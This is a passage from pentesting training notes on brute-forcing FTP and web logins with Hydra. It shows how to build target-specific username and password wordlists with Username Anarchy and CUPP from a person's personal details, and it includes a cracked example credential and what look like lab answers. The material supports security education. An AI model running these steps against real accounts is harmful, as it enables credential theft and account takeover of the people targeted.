ftp ftp://ftpuser:<FTPUSER_PASSWORD>@localhost
# or use
ftp localhost
```

```bash
ACCOUNT FOUND: [ftp] Host: 127.0.0.1 User: ftpuser Password: pass1234 [SUCCESS]
```

## Mitigation Measures

- **Use Strong Passwords**: Avoid common or guessable passwords.
- **Enable Multi-Factor Authentication (MFA)**: Adds extra security layers.
- **Rate Limiting**: Restrict login attempts to deter brute-force attacks.
- **Monitor and Alert**: Implement log monitoring to detect unauthorized attempts.

# Custom Wordlists

Generic wordlists may not always yield results, especially against specific individuals or organizations. **Custom wordlists** allow pentesters to craft personalized lists that significantly enhance brute-force attack success rates.

### Username Generation - Username Anarchy

```bash
sudo apt install ruby -y
git clone <https://github.com/urbanadventurer/username-anarchy.git>
cd username-anarchy
```

Generating:

```bash
./username-anarchy Jane Smith > jane_smith_usernames.txt
###
cat jane_smith_usernames.txt 
jane
janesmith
jane.smith
janesmit
janes
j.smith
jsmith
sjane
s.jane
smithj
smith
smith.j
smith.jane
js
```

Generates various username combinations such as:

- Basic: `janesmith`, `smithjane`, `j.smith`
- Initials: `js`, `j.s.`, `smith.jane`

---

## Password Generation - CUPP (Common User Passwords Profiler)

### Installation

```bash
sudo apt install cupp -y
# interactive mode
cupp -i
```

**Example Input for Jane Smith:**

```bash
> First Name: Jane
> Surname: Smith
> Nickname: Janey
> Birthdate (DDMMYYYY): 11121990
> Partner's name: Jim
> Pet's name: Spot
> Company name: AHI
> Add keywords: hacker,blue
> Special chars, numbers, leet mode: Yes

```

```bash
Saving dictionary to jane.txt, counting 46790 words.
```

---

## Filtering Wordlists for Password Policies

Jane's company enforces the following password policy:

- **Minimum Length**: 6 characters
- **At least 1 uppercase, 1 lowercase, 1 number, 2 special characters (!@#$%^&*)**

### Filtering with Grep

```bash
grep -E '^.{6,}$' jane.txt | grep -E '[A-Z]' | grep -E '[a-z]' | grep -E '[0-9]' | grep -E '([!@#$%^&*].*){2,}' > jane-filtered.txt
```

This command efficiently filters `jane.txt` to match the provided policy, from ~46000 passwords to a possible ~7900. It first ensures a minimum length of 6 characters, then checks for at least one uppercase letter, one lowercase letter, one number, and finally, at least two special characters from the specified set. The filtered results are stored in `jane-filtered.txt`.

---

## Brute-Force Attack with Hydra

### Using Custom Wordlists

```bash
hydra -L usernames.txt -P jane-filtered.txt IP -s PORT -f http-post-form "/:username=^USER^&password=^PASS^:Invalid credentials"
```

---

## Mitigation Measures

- **Implement Complex Password Policies**: Enforce length, uppercase, and special character requirements.
- **Monitor and Limit Login Attempts**: Introduce account lockouts or CAPTCHA after failed attempts.
- **Educate Users**: Encourage unique, complex passwords to prevent pattern-based attacks.
- **Enable MFA**: Add an extra layer of authentication.

satwossh

chocolate!